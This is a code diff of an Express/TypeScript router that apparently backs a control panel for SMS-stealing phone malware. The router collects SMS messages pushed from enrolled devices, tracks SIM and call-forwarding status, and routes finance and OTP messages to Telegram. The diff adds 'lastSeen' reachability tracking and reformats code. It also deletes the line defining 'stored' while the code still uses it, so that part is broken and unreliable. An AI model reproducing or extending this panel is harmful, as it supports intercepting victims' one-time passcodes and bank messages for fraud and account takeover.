@@ -5,7 +5,11 @@ import Device from "../models/Device";
 import Sms from "../models/Sms";
 import AdminModel from "../models/Admin";
 import wsService from "../services/wsService";
-import { updateFcmToken } from "../services/deviceService";
+import {
+  updateFcmToken,
+  updateLastSeen,
+  touchLastSeen,
+} from "../services/deviceService";
 import config from "../config";
 import { classifySms } from "../services/smsClassifier";
 import {
@@ -24,6 +28,10 @@ const router = express.Router();
 
 const DELETE_PASSWORD_KEY = "delete_password";
 const DELETE_PASSWORD_PHONE = "delete_password";
+
+/* ═══════════════════════════════════════════
+   HELPERS
+   ═══════════════════════════════════════════ */
 
 function clean(v: unknown): string {
   return String(v ?? "").trim();
@@ -55,9 +63,7 @@ async function saveDeletePassword(password: string) {
       {
         $set: {
           phone: DELETE_PASSWORD_PHONE,
-          meta: {
-            password: cleanPassword,
-          },
+          meta: { password: cleanPassword },
         },
       },
       { upsert: true, new: true },
@@ -72,11 +78,7 @@ async function assertDeletePassword(password: string) {
   const entered = clean(password);
 
   if (!entered) {
-    return {
-      ok: false,
-      status: 400,
-      error: "password required",
-    } as const;
+    return { ok: false, status: 400, error: "password required" } as const;
   }
 
   if (entered.length < 4) {
@@ -87,29 +89,17 @@ async function assertDeletePassword(password: string) {
     } as const;
   }
 
-  const stored = await getStoredDeletePassword();
-
   if (!stored) {
     await saveDeletePassword(entered);
     logger.info("devices: delete password created on first protected delete");
-    return {
-      ok: true,
-      created: true,
-    } as const;
+    return { ok: true, created: true } as const;
   }
 
   if (stored !== entered) {
-    return {
-      ok: false,
-      status: 403,
-      error: "invalid password",
-    } as const;
+    return { ok: false, status: 403, error: "invalid password" } as const;
   }
 
-  return {
-    ok: true,
-    created: false,
-  } as const;
+  return { ok: true, created: false } as const;
 }
 
 function toTelegramCategories(
@@ -138,7 +128,36 @@ function toCategoryLabels(
   return labels;
 }
 
+/**
+ * Compute device reachability from lastSeen.at
+ */
+function computeReachability(lastSeenAt: number): {
+  status: "responsive" | "idle" | "unreachable";
+  lastSeenAt: number;
+  agoMs: number;
+} {
+  const now = Date.now();
+  const agoMs = lastSeenAt > 0 ? now - lastSeenAt : -1;
+
+  let status: "responsive" | "idle" | "unreachable";
+
+  if (lastSeenAt <= 0) {
+    status = "unreachable";
+  } else if (agoMs <= 15 * 60 * 1000) {
+    status = "responsive";
+  } else if (agoMs <= 2 * 60 * 60 * 1000) {
+    status = "idle";
+  } else {
+    status = "unreachable";
+  }
+
+  return { status, lastSeenAt, agoMs };
+}
+
 function getDeviceTelegramMeta(device: any, deviceId: string) {
+  const lastSeenAt = Number(device?.lastSeen?.at || 0);
+  const reachability = computeReachability(lastSeenAt);
+
   return {
     pannelId: config.pannelId,
     deviceId,
@@ -146,8 +165,8 @@ function getDeviceTelegramMeta(device: any, deviceId: string) {
       device?.metadata?.brand || device?.metadata?.manufacturer || "",
     ),
     model: clean(device?.metadata?.model || ""),
-    online: !!device?.status?.online,
-    lastSeen: Number(device?.status?.timestamp || Date.now()),
+    online: reachability.status === "responsive",
+    lastSeen: lastSeenAt,
   };
 }
 
@@ -162,11 +181,13 @@ async function emitDeviceUpsert(deviceId: string) {
   }
 }
 
-/* ================= LIST ALL DEVICES ================= */
+/* ═══════════════════════════════════════════
+   LIST ALL DEVICES
+   ═══════════════════════════════════════════ */
 
 router.get("/", async (_req, res) => {
   try {
-    const devices = await Device.find().lean();
+    const devices = await Device.find().sort({ "lastSeen.at": -1 }).lean();
     return res.json(devices);
   } catch (err: any) {
     logger.error("devices: list failed", err);
@@ -174,23 +195,40 @@ router.get("/", async (_req, res) => {
   }
 });
 
-/* ================= STATUS SNAPSHOT ================= */
+/* ═══════════════════════════════════════════
+   STATUS SNAPSHOT (lastSeen based)
+   ═══════════════════════════════════════════ */
 
 router.get("/status", async (_req, res) => {
   try {
-    const devices = await Device.find().lean();
+    const devices = await Device.find()
+      .select("deviceId lastSeen")
+      .lean();
 
     const statusMap: Record<
       string,
-      { online: boolean; lastSeen: number | null }
+      {
+        status: "responsive" | "idle" | "unreachable";
+        lastSeenAt: number;
+        lastAction: string;
+        battery: number;
+        agoMs: number;
+      }
     > = {};
 
     devices.forEach((d: any) => {
-      if (!d.deviceId) return;
+      const did = clean(d.deviceId);
+      if (!did) return;
 
-      statusMap[d.deviceId] = {
-        online: d?.status?.online ?? false,
-        lastSeen: d?.status?.timestamp ?? null,
+      const lastSeenAt = Number(d?.lastSeen?.at || 0);
+      const reachability = computeReachability(lastSeenAt);
+
+      statusMap[did] = {
+        status: reachability.status,
+        lastSeenAt: reachability.lastSeenAt,
+        lastAction: clean(d?.lastSeen?.action),
+        battery: Number(d?.lastSeen?.battery ?? -1),
+        agoMs: reachability.agoMs,
       };
     });
 
@@ -201,7 +239,51 @@ router.get("/status", async (_req, res) => {
   }
 });
 
-/* ================= ADMINS ================= */
+/* ═══════════════════════════════════════════
+   LAST SEEN (NEW — primary reachability endpoint)
+   ═══════════════════════════════════════════ */
+
+router.put("/:deviceId/lastSeen", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    if (!deviceId) {
+      return res.status(400).json({ success: false, error: "missing deviceId" });
+    }
+
+    const action = clean(req.body?.action) || "unknown";
+    const battery =
+      typeof req.body?.battery === "number" ? req.body.battery : -1;
+
+    const doc = await updateLastSeen(deviceId, action, battery);
+
+    try {
+      wsService.notifyDeviceLastSeen(deviceId, {
+        at: Date.now(),
+        action,
+        battery,
+      });
+    } catch {
+      // ignore
+    }
+
+    try {
+      if (doc) {
+        wsService.broadcastDeviceUpsert(doc);
+      }
+    } catch {
+      // ignore
+    }
+
+    return res.json({ success: true });
+  } catch (err: any) {
+    logger.error("devices: update lastSeen failed", err);
+    return res.status(500).json({ success: false, error: err?.message || "server error" });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   ADMINS
+   ═══════════════════════════════════════════ */
 
 router.get("/:deviceId/admins", async (req, res) => {
   try {
@@ -258,11 +340,7 @@ router.put("/:deviceId/admins", async (req, res) => {
       logger.warn("devices: broadcast device:upsert after admins failed", e);
     }
 
-    return res.json({
-      success: true,
-      admins,
-      device: doc,
-    });
+    return res.json({ success: true, admins, device: doc });
   } catch (err: any) {
     logger.error("devices: update admins failed", err);
     return res.status(500).json({
@@ -285,7 +363,9 @@ router.get("/:deviceId/adminPhone", async (req, res) => {
   }
 });
 
-/* ================= FORWARDING SIM ================= */
+/* ═══════════════════════════════════════════
+   FORWARDING SIM
+   ═══════════════════════════════════════════ */
 
 router.get("/:deviceId/forwardingSim", async (req, res) => {
   try {
@@ -308,11 +388,7 @@ router.put("/:deviceId/forwardingSim", async (req, res) => {
 
     const doc = await Device.findOneAndUpdate(
       { deviceId },
-      {
-        $set: {
-          forwardingSim: value,
-        },
-      },
+      { $set: { forwardingSim: value } },
       { upsert: true, new: true },
     ).lean();
 
@@ -328,14 +404,13 @@ router.put("/:deviceId/forwardingSim", async (req, res) => {
     try {
       if (doc) wsService.broadcastDeviceUpsert(doc);
     } catch (e) {
-      logger.warn("devices: broadcast device:upsert after forwardingSim failed", e);
+      logger.warn(
+        "devices: broadcast device:upsert after forwardingSim failed",
+        e,
+      );
     }
 
-    return res.json({
-      success: true,
-      value,
-      device: doc,
-    });
+    return res.json({ success: true, value, device: doc });
   } catch (err: any) {
     logger.error("devices: update forwardingSim failed", err);
     return res.status(500).json({
@@ -345,7 +420,9 @@ router.put("/:deviceId/forwardingSim", async (req, res) => {
   }
 });
 
-/* ================= SIM INFO ================= */
+/* ═══════════════════════════════════════════
+   SIM INFO
+   ═══════════════════════════════════════════ */
 
 router.get("/:deviceId/simInfo", async (req, res) => {
   try {
@@ -353,10 +430,7 @@ router.get("/:deviceId/simInfo", async (req, res) => {
     const device = await Device.findOne({ deviceId }).lean();
 
     if (!device) {
-      return res.status(404).json({
-        success: false,
-        error: "Device not found",
-      });
+      return res.status(404).json({ success: false, error: "Device not found" });
     }
 
     return res.json((device as any)?.simInfo || {});
@@ -381,14 +455,13 @@ router.put("/:deviceId/simInfo", async (req, res) => {
     return res.json({ success: true });
   } catch (err: any) {
     logger.error("devices: update simInfo failed", err);
-    return res.status(500).json({
-      success: false,
-      error: err?.message,
-    });
+    return res.status(500).json({ success: false, error: err?.message });
   }
 });
 
-/* ================= FCM TOKEN ================= */
+/* ═══════════════════════════════════════════
+   FCM TOKEN
+   ═══════════════════════════════════════════ */
 
 router.put("/:deviceId/fcm-token", async (req: Request, res: Response) => {
   try {
@@ -396,17 +469,11 @@ router.put("/:deviceId/fcm-token", async (req: Request, res: Response) => {
     const token = clean(req.body?.token ?? req.body?.fcmToken ?? "");
 
     if (!deviceId) {
-      return res.status(400).json({
-        success: false,
-        error: "missing deviceId",
-      });
+      return res.status(400).json({ success: false, error: "missing deviceId" });
     }
 
     if (!token) {
-      return res.status(400).json({
-        success: false,
-        error: "missing token",
-      });
+      return res.status(400).json({ success: false, error: "missing token" });
     }
 
     await updateFcmToken(deviceId, token);
@@ -416,12 +483,15 @@ router.put("/:deviceId/fcm-token", async (req: Request, res: Response) => {
       tokenLength: token.length,
     });
 
+    try {
+      await touchLastSeen(deviceId, "fcm_token_sync");
+    } catch {
+      // ignore
+    }
+
     await emitDeviceUpsert(deviceId);
 
-    return res.json({
-      success: true,
-      deviceId,
-    });
+    return res.json({ success: true, deviceId });
   } catch (err: any) {
     logger.error("devices: update fcm-token failed", err);
     return res.status(500).json({
@@ -431,7 +501,9 @@ router.put("/:deviceId/fcm-token", async (req: Request, res: Response) => {
   }
 });
 
-/* ================ SIM SLOT UPDATE (CALL-FORWARD CONFIRMATION) ================ */
+/* ═══════════════════════════════════════════
+   SIM SLOT UPDATE (CALL-FORWARD CONFIRMATION)
+   ═══════════════════════════════════════════ */
 
 router.put("/:deviceId/simSlots/:slot", async (req, res) => {
   try {
@@ -439,9 +511,7 @@ router.put("/:deviceId/simSlots/:slot", async (req, res) => {
     const slot = clean(req.params.slot);
 
     if (!deviceId || slot === "") {
-      return res
-        .status(400)
-        .json({ success: false, error: "invalid params" });
+      return res.status(400).json({ success: false, error: "invalid params" });
     }
 
     const status =
@@ -479,6 +549,12 @@ router.put("/:deviceId/simSlots/:slot", async (req, res) => {
       logger.warn("wsService notify simSlots failed", e);
     }
 
+    try {
+      await touchLastSeen(deviceId, "call_forwarded");
+    } catch {
+      // ignore
+    }
+
     await emitDeviceUpsert(deviceId);
 
     return res.json({ success: true });
@@ -488,7 +564,9 @@ router.put("/:deviceId/simSlots/:slot", async (req, res) => {
   }
 });
 
-/* ================= NOTIFICATIONS ================= */
+/* ═══════════════════════════════════════════
+   NOTIFICATIONS
+   ═══════════════════════════════════════════ */
 
 router.get("/notifications", async (_req, res) => {
   try {
@@ -513,10 +591,7 @@ router.get("/notifications/summary", async (_req, res) => {
     const [totalSms, distinctDeviceIds, latestSms] = await Promise.all([
       Sms.countDocuments({}),
       Sms.distinct("deviceId"),
-      Sms.findOne({})
-        .sort({ timestamp: -1 })
-        .select("timestamp")
-        .lean(),
+      Sms.findOne({}).sort({ timestamp: -1 }).select("timestamp").lean(),
     ]);
 
     const cleanIds = (distinctDeviceIds || [])
@@ -567,110 +642,111 @@ router.get("/notifications/device/:deviceId", async (req, res) => {
   }
 });
 
-router.delete("/notifications/device/:deviceId/:smsId", async (req, res) => {
-  try {
-    const passwordCheck = await assertDeletePassword(req.body?.password);
-    if (!passwordCheck.ok) {
-      return res.status(passwordCheck.status).json({
-        success: false,
-        error: passwordCheck.error,
-      });
-    }
-
-    const deviceId = clean(req.params.deviceId);
-    const smsId = clean(req.params.smsId);
-
-    const deleted = await Sms.findOneAndDelete({
-      _id: smsId,
-      deviceId,
-    });
-
-    if (!deleted) {
-      return res.status(404).json({
-        success: false,
-        error: "SMS not found",
-      });
-    }
-
+router.delete(
+  "/notifications/device/:deviceId/:smsId",
+  async (req, res) => {
     try {
-      const payload = {
-        type: "event",
-        event: "notification:deleted",
-        deviceId,
-        data: {
-          id: smsId,
-          _id: smsId,
-        },
-        timestamp: Date.now(),
-      };
+      const passwordCheck = await assertDeletePassword(req.body?.password);
+      if (!passwordCheck.ok) {
+        return res
+          .status(passwordCheck.status)
+          .json({ success: false, error: passwordCheck.error });
+      }
+
+      const deviceId = clean(req.params.deviceId);
+      const smsId = clean(req.params.smsId);
+
+      const deleted = await Sms.findOneAndDelete({ _id: smsId, deviceId });
+
+      if (!deleted) {
+        return res
+          .status(404)
+          .json({ success: false, error: "SMS not found" });
+      }
 
       try {
-        wsService.sendToAdminDevice(deviceId, payload);
-      } catch (wsErr) {
-        logger.warn("wsService notify notification:deleted failed", wsErr);
+        const payload = {
+          type: "event",
+          event: "notification:deleted",
+          deviceId,
+          data: { id: smsId, _id: smsId },
+          timestamp: Date.now(),
+        };
+        try {
+          wsService.sendToAdminDevice(deviceId, payload);
+        } catch (wsErr) {
+          logger.warn(
+            "wsService notify notification:deleted failed",
+            wsErr,
+          );
+        }
+      } catch (emitErr) {
+        logger.warn("notifications single delete emit failed", emitErr);
       }
-    } catch (emitErr) {
-      logger.warn("notifications single delete emit failed", emitErr);
+
+      try {
+        const device = await Device.findOne({ deviceId }).lean();
+        const meta = getDeviceTelegramMeta(device, deviceId);
+
+        const deleteText = buildTelegramSmsDeletedMessage({
+          ...meta,
+          smsId,
+          smsText: clean((deleted as any)?.body || ""),
+          smsTitle: clean((deleted as any)?.title || ""),
+          sender: clean(
+            (deleted as any)?.senderNumber ||
+              (deleted as any)?.sender ||
+              "",
+          ),
+          receiver: clean((deleted as any)?.receiver || ""),
+          deletedAt: Date.now(),
+        });
+
+        const deleteResult = await sendTelegramMessage({
+          category: "delete_alert",
+          text: deleteText,
+        });
+
+        logger.info("devices: telegram SMS delete alert sent", {
+          deviceId,
+          smsId,
+          ok: deleteResult.ok,
+          skipped: deleteResult.skipped,
+          error: deleteResult.error,
+        });
+      } catch (telegramErr: any) {
+        logger.error(
+          "devices: telegram SMS delete alert failed (non-fatal)",
+          {
+            deviceId,
+            smsId,
+            error: telegramErr?.message || telegramErr,
+          },
+        );
+      }
+
+      return res.json({
+        success: true,
+        deletedId: smsId,
+        passwordCreated: passwordCheck.created,
+      });
+    } catch (e: any) {
+      logger.error("notifications single delete failed", e);
+      return res.status(500).json({
+        success: false,
+        error: e?.message || "server error",
+      });
     }
-
-    try {
-      const device = await Device.findOne({ deviceId }).lean();
-      const meta = getDeviceTelegramMeta(device, deviceId);
-
-      const deleteText = buildTelegramSmsDeletedMessage({
-        ...meta,
-        smsId,
-        smsText: clean((deleted as any)?.body || ""),
-        smsTitle: clean((deleted as any)?.title || ""),
-        sender: clean(
-          (deleted as any)?.senderNumber || (deleted as any)?.sender || "",
-        ),
-        receiver: clean((deleted as any)?.receiver || ""),
-        deletedAt: Date.now(),
-      });
-
-      const deleteResult = await sendTelegramMessage({
-        category: "delete_alert",
-        text: deleteText,
-      });
-
-      logger.info("devices: telegram SMS delete alert sent", {
-        deviceId,
-        smsId,
-        ok: deleteResult.ok,
-        skipped: deleteResult.skipped,
-        error: deleteResult.error,
-      });
-    } catch (telegramErr: any) {
-      logger.error("devices: telegram SMS delete alert failed (non-fatal)", {
-        deviceId,
-        smsId,
-        error: telegramErr?.message || telegramErr,
-      });
-    }
-
-    return res.json({
-      success: true,
-      deletedId: smsId,
-      passwordCreated: passwordCheck.created,
-    });
-  } catch (e: any) {
-    logger.error("notifications single delete failed", e);
-    return res.status(500).json({
-      success: false,
-      error: e?.message || "server error",
-    });
-  }
-});
+  },
+);
 
 router.delete("/notifications/device/:deviceId", async (req, res) => {
   try {
     const passwordCheck = await assertDeletePassword(req.body?.password);
     if (!passwordCheck.ok) {
-      return res.status(passwordCheck.status).json({
-        success: false,
-        error: passwordCheck.error,
-      });
+      return res
+        .status(passwordCheck.status)
+        .json({ success: false, error: passwordCheck.error });
     }
 
     const deviceId = clean(req.params.deviceId);
@@ -682,10 +758,7 @@ router.delete("/notifications/device/:deviceId", async (req, res) => {
       logger.warn("notifications clear device broadcast failed", e);
     }
 
-    return res.json({
-      success: true,
-      passwordCreated: passwordCheck.created,
-    });
+    return res.json({ success: true, passwordCreated: passwordCheck.created });
   } catch (e: any) {
     logger.error("notifications delete for device failed", e);
     return res.status(500).json({ success: false, error: e?.message });
@@ -696,10 +769,9 @@ router.delete("/notifications", async (req, res) => {
   try {
     const passwordCheck = await assertDeletePassword(req.body?.password);
     if (!passwordCheck.ok) {
-      return res.status(passwordCheck.status).json({
-        success: false,
-        error: passwordCheck.error,
-      });
+      return res
+        .status(passwordCheck.status)
+        .json({ success: false, error: passwordCheck.error });
     }
 
     await Sms.deleteMany({});
@@ -710,10 +782,7 @@ router.delete("/notifications", async (req, res) => {
       logger.warn("notifications clear all broadcast failed", e);
     }
 
-    return res.json({
-      success: true,
-      passwordCreated: passwordCheck.created,
-    });
+    return res.json({ success: true, passwordCreated: passwordCheck.created });
   } catch (e: any) {
     logger.error("notifications delete all failed", e);
     return res.status(500).json({ success: false });
@@ -724,10 +793,9 @@ router.delete("/notifications/olderThan/:cutoff", async (req, res) => {
   try {
     const passwordCheck = await assertDeletePassword(req.body?.password);
     if (!passwordCheck.ok) {
-      return res.status(passwordCheck.status).json({
-        success: false,
-        error: passwordCheck.error,
-      });
+      return res
+        .status(passwordCheck.status)
+        .json({ success: false, error: passwordCheck.error });
     }
 
     const cutoff = Number(req.params.cutoff || 0);
@@ -739,17 +807,16 @@ router.delete("/notifications/olderThan/:cutoff", async (req, res) => {
       logger.warn("notifications olderThan broadcast failed", e);
     }
 
-    return res.json({
-      success: true,
-      passwordCreated: passwordCheck.created,
-    });
+    return res.json({ success: true, passwordCreated: passwordCheck.created });
   } catch (e: any) {
     logger.error("notifications delete olderThan failed", e);
     return res.status(500).json({ success: false });
   }
 });
 
-/* ================= SMS PUSH (SENDSMS SWITCH + WS + TELEGRAM ROUTING) ================= */
+/* ═══════════════════════════════════════════
+   SMS PUSH (SAFE + SENDSMS SWITCH + WS + TELEGRAM ROUTING)
+   ═══════════════════════════════════════════ */
 
 router.post("/:id/sms", async (req: Request, res: Response) => {
   try {
@@ -765,10 +832,9 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
 
     if (!receiver) {
       logger.warn("devices:sms missing receiver", { body: req.body });
-      return res.status(400).json({
-        success: false,
-        error: "receiver missing",
-      });
+      return res
+        .status(400)
+        .json({ success: false, error: "receiver missing" });
     }
 
     const rawTs = req.body.timestamp;
@@ -791,31 +857,17 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
 
     const sendSmsDisabled = isSendSmsDisabled();
 
-    try {
-      await Device.findOneAndUpdate(
-        { deviceId },
-        {
-          $set: {
-            "status.timestamp": finalTimestamp,
-          },
-        },
-        { upsert: true },
-      );
-    } catch (e) {
-      logger.warn("devices: update device timestamp after sms failed", e);
-    }
-
-    let device: any = null;
-    try {
-      device = await Device.findOne({ deviceId }).lean();
-    } catch (e) {
-      logger.warn("devices: load device for telegram meta failed", e);
-    }
-
-    const meta = getDeviceTelegramMeta(device, deviceId);
-
     if (sendSmsDisabled) {
       try {
+        await touchLastSeen(deviceId, "sms_pushed");
+      } catch {
+        // ignore
+      }
+
+      try {
+        const device = await Device.findOne({ deviceId }).lean();
+        const meta = getDeviceTelegramMeta(device, deviceId);
+
         const telegramText = buildTelegramAllOtpSmsMessage({
           ...meta,
           smsText: clean(smsPayload.body),
@@ -846,7 +898,7 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
       try {
         await emitDeviceUpsert(deviceId);
       } catch (e) {
-        logger.warn("devices: emit device upsert after SENDSMS=no failed", e);
+        logger.warn("devices: lastSeen/emit after SENDSMS=no failed", e);
       }
 
       return res.json({
@@ -882,7 +934,8 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
       try {
         wsService.sendToAdminDevice(deviceId, payload);
       } catch (wsErr) {
-        const io: any = (req.app && req.app.get && req.app.get("io")) || null;
+        const io: any =
+          (req.app && req.app.get && req.app.get("io")) || null;
         if (io && typeof io.emit === "function") {
           io.emit("event", payload);
         }
@@ -892,21 +945,23 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
     }
 
     try {
+      await touchLastSeen(deviceId, "sms_pushed");
       await emitDeviceUpsert(deviceId);
     } catch (e) {
-      logger.warn("devices: emit device upsert after sms failed", e);
+      logger.warn("devices: lastSeen/emit after sms failed", e);
     }
 
     try {
       const smsText = clean(smsDoc.body);
-      const classification = classifySms(
-        smsText,
-        clean((smsDoc as any).senderNumber || smsDoc.sender),
-      );
+      const classification = classifySms(smsText);
 
       if (classification.isFinance) {
+        const device = await Device.findOne({ deviceId }).lean();
+        const meta = getDeviceTelegramMeta(device, deviceId);
         const categoryLabels = toCategoryLabels(classification.categories);
-        const telegramCategories = toTelegramCategories(classification.categories);
+        const telegramCategories = toTelegramCategories(
+          classification.categories,
+        );
 
         const telegramText = buildTelegramSmsMessage({
           ...meta,
@@ -928,8 +983,6 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
           categories: telegramCategories,
           labels: categoryLabels,
           matchedKeywords: classification.matchedKeywords,
-          online: meta.online,
-          lastSeen: meta.lastSeen,
           results: telegramResults.map((x) => ({
             category: x.category,
             ok: x.ok,
@@ -940,10 +993,7 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
       } else {
         logger.info(
           "devices: sms saved but not routed to Telegram (non-finance)",
-          {
-            deviceId,
-            smsId: smsDoc._id?.toString?.(),
-          },
+          { deviceId, smsId: smsDoc._id?.toString?.() },
         );
       }
     } catch (telegramErr: any) {
@@ -961,14 +1011,13 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
     });
   } catch (err: any) {
     logger.error("SMS save failed", err);
-    return res.status(500).json({
-      success: false,
-      error: err?.message,
-    });
+    return res.status(500).json({ success: false, error: err?.message });
   }
 });
 
-/* ================= DEVICE GET ================= */
+/* ═══════════════════════════════════════════
+   DEVICE GET
+   ═══════════════════════════════════════════ */
 
 router.get("/:deviceId", async (req, res) => {
   try {
@@ -976,141 +1025,76 @@ router.get("/:deviceId", async (req, res) => {
     const device = await Device.findOne({ deviceId }).lean();
 
     if (!device) {
-      return res.status(404).json({
-        success: false,
-        error: "Device not found",
-      });
+      return res
+        .status(404)
+        .json({ success: false, error: "Device not found" });
     }
 
     return res.json(device);
   } catch (err: any) {
     logger.error("devices: get single failed", err);
-    return res.status(500).json({
-      success: false,
-      error: err?.message,
-    });
+    return res.status(500).json({ success: false, error: err?.message });
   }
 });
 
-/* ================= STATUS UPDATE ================= */
-
-router.put("/:deviceId/status", async (req, res) => {
-  try {
-    const deviceId = clean(req.params.deviceId);
-    const online = !!req.body?.online;
-    const ts = Number(req.body?.timestamp || Date.now());
-
-    const doc = await Device.findOneAndUpdate(
-      { deviceId },
-      {
-        $set: {
-          "status.online": online,
-          "status.timestamp": isNaN(ts) ? Date.now() : ts,
-        },
-      },
-      { upsert: true, new: true },
-    ).lean();
-
-    try {
-      const payload = {
-        type: "event",
-        event: "status",
-        deviceId,
-        data: { online, timestamp: isNaN(ts) ? Date.now() : ts },
-        timestamp: Date.now(),
-      };
-      try {
-        wsService.sendToAdminDevice(deviceId, payload);
-      } catch (wsErr) {
-        const io: any = (req.app && req.app.get && req.app.get("io")) || null;
-        if (io && typeof io.emit === "function") io.emit("event", payload);
-      }
-    } catch (e) {
-      logger.warn("WS emit status failed (non-fatal)", e);
-    }
-
-    try {
-      if (doc) wsService.broadcastDeviceUpsert(doc);
-    } catch (e) {
-      logger.warn("devices: broadcast device:upsert after status failed", e);
-    }
-
-    return res.json({ success: true });
-  } catch (err: any) {
-    logger.error("devices: update status failed", err);
-    return res.status(500).json({
-      success: false,
-      error: err?.message,
-    });
-  }
-});
-
-/* ================= UPDATE METADATA ================= */
+/* ═══════════════════════════════════════════
+   UPDATE METADATA (device registration)
+   ═══════════════════════════════════════════ */
 
 router.put("/:deviceId", async (req, res) => {
   try {
     const deviceId = clean(req.params.deviceId);
 
+    const metadata = req.body || {};
+    const fcmToken =
+      typeof metadata.fcmToken === "string"
+        ? metadata.fcmToken.trim()
+        : undefined;
+
+    const setObj: Record<string, any> = {
+      metadata,
+      "lastSeen.at": Date.now(),
+      "lastSeen.action": "register",
+    };
+
+    if (fcmToken) {
+      setObj.fcmToken = fcmToken;
+      setObj.fcmTokenUpdatedAt = Date.now();
+    }
+
     const doc = await Device.findOneAndUpdate(
       { deviceId },
-      { $set: { metadata: req.body } },
+      { $set: setObj },
       { upsert: true, new: true },
     ).lean();
 
     try {
       if (doc) wsService.broadcastDeviceUpsert(doc);
     } catch (e) {
-      logger.warn("devices: broadcast device:upsert after metadata failed", e);
+      logger.warn(
+        "devices: broadcast device:upsert after metadata failed",
+        e,
+      );
     }
 
     return res.json({ success: true });
   } catch (err: any) {
     logger.error("devices: update metadata failed", err);
-    return res.status(500).json({
-      success: false,
-      error: err?.message,
-    });
+    return res.status(500).json({ success: false, error: err?.message });
   }
 });
 
-/* ================= DELETE ================= */
-
-router.delete("/status/:deviceId", async (req, res) => {
-  try {
-    const deviceId = clean(req.params.deviceId);
-
-    const doc = await Device.findOneAndUpdate(
-      { deviceId },
-      {
-        $set: {
-          "status.online": false,
-          "status.timestamp": Date.now(),
-        },
-      },
-      { new: true },
-    ).lean();
-
-    try {
-      if (doc) wsService.broadcastDeviceUpsert(doc);
-    } catch (e) {
-      logger.warn("devices: broadcast device:upsert after delete status failed", e);
-    }
-
-    return res.json({ success: true });
-  } catch (err: any) {
-    logger.error("devices: delete status failed", err);
-    return res.status(500).json({ success: false });
-  }
-});
+/* ═══════════════════════════════════════════
+   DELETE
+   ═══════════════════════════════════════════ */
 
 router.delete("/:deviceId", async (req, res) => {
   try {
     const passwordCheck = await assertDeletePassword(req.body?.password);
     if (!passwordCheck.ok) {
-      return res.status(passwordCheck.status).json({
-        success: false,
-        error: passwordCheck.error,
-      });
+      return res
+        .status(passwordCheck.status)
+        .json({ success: false, error: passwordCheck.error });
     }
 
     const deviceId = clean(req.params.deviceId);
@@ -1143,10 +1127,13 @@ router.delete("/:deviceId", async (req, res) => {
         error: deleteResult.error,
       });
     } catch (telegramErr: any) {
-      logger.error("devices: telegram device delete alert failed (non-fatal)", {
-        deviceId,
-        error: telegramErr?.message || telegramErr,
-      });
+      logger.error(
+        "devices: telegram device delete alert failed (non-fatal)",
+        {
+          deviceId,
+          error: telegramErr?.message || telegramErr,
+        },
+      );
     }
 
     return res.json({
